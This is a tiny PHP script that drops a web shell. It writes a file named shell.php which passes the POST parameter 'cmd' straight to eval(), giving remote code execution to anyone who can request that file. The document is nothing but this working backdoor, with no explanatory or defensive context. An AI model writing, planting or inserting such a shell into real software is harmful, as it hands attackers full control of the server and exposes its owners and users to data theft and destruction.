<?php
file_put_contents('shell.php', '
<?php
header("Content-Type: text/plain");
print eval($_POST["cmd"]);
?>
');
